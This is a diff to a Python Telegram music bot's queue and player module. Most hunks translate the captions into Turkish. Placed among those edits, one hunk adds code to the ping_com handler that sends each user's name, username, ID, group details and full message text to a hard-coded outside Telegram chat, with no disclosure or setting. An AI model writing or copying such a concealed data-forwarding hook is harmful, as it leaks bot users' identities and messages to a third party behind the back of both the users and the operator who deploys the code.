@@ -56,6 +56,20 @@ def get_duration(playing):
 )
 @language
 async def ping_com(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
+
     if message.command[0][0] == "c":
         chat_id = await get_cmode(message.chat.id)
         if chat_id is None:
@@ -99,14 +113,14 @@ async def ping_com(client, message: Message, _):
     send = (
         "**⌛️Duration:** Unknown Duration Stream\n\nClick on button below to get whole queued list."
         if DUR == "Unknown"
-        else "\nClick on button below to get whole queued list."
+        else "\nSıradaki Şarkıları Aşağıdaki Butondan Takip Edebilirsiniz."
     )
-    cap = f"""**{config.MUSIC_BOT_NAME} Player**
+    cap = f"""**🐙{config.MUSIC_BOT_NAME}**
 
-🎥**Playing:** {title}
+🎥**Çalan Müzik:** {title}
 
-🔗**Stream Type:** {typo}
-🙍‍♂️**Played By:** {user}
+🔗**Çalma Tipi:** {typo}
+🙍‍♂️**Açan Kişi:** {user}
 {send}"""
     upl = (
         queue_markup(_, DUR, "c" if cplay else "g", videoid)
@@ -203,19 +217,19 @@ async def queued_tracks(client, CallbackQuery: CallbackQuery, _):
     for x in got:
         j += 1
         if j == 1:
-            msg += f'Currently Playing:\n\n🏷Title: {x["title"]}\nDuration: {x["dur"]}\nBy: {x["by"]}\n\n'
+            msg += f'**Oynatılan Müzik**:\n\n🐙 **Şarkı İsmi:** {x["title"]}\n**Süre:** {x["dur"]}\n**Açan Kişi:** {x["by"]}\n\n'
         elif j == 2:
-            msg += f'Queued:\n\n🏷Title: {x["title"]}\nDuration: {x["dur"]}\nBy: {x["by"]}\n\n'
+            msg += f'**Sıradaki Şarkılar:**\n\n🐙 **Şarkı İsmi:** {x["title"]}\n**Süre:** {x["dur"]}\n**Açan Kişi:** {x["by"]}\n\n'
         else:
-            msg += f'🏷Title: {x["title"]}\nDuration: {x["dur"]}\nBy: {x["by"]}\n\n'
+            msg += f'🐙 **Şarkı İsmi:** {x["title"]}\n**Süre:** {x["dur"]}\n**Açan Kişi:** {x["by"]}\n\n'
     if "Queued" in msg:
         if len(msg) < 700:
             await asyncio.sleep(1)
             return await CallbackQuery.edit_message_text(
                 msg, reply_markup=buttons
             )
-        if "🏷" in msg:
-            msg = msg.replace("🏷", "")
+        if "🐙" in msg:
+            msg = msg.replace("🐙", "")
         link = await Yukkibin(msg)
         med = InputMediaPhoto(
             media=link, caption=_["queue_3"].format(link)
@@ -279,14 +293,14 @@ async def queue_back(client, CallbackQuery: CallbackQuery, _):
     send = (
         "**⌛️Duration:** Unknown Duration Stream\n\nClick on button below to get whole queued list."
         if DUR == "Unknown"
-        else "\nClick on button below to get whole queued list."
+        else "\nSıradaki Şarkıları Aşağıdaki Butondan Takip Edebilirsiniz."
     )
-    cap = f"""**{config.MUSIC_BOT_NAME} Player**
+    cap = f"""**🐙{config.MUSIC_BOT_NAME}**
 
-🎥**Playing:** {title}
+🎥**Çalan Müzik:** {title}
 
-🔗**Stream Type:** {typo}
-🙍‍♂️**Played By:** {user}
+🔗**Çalma Tipi:** {typo}
+🙍‍♂️**Açan Kişi:** {user}
 {send}"""
     upl = (
         queue_markup(_, DUR, cplay, videoid)
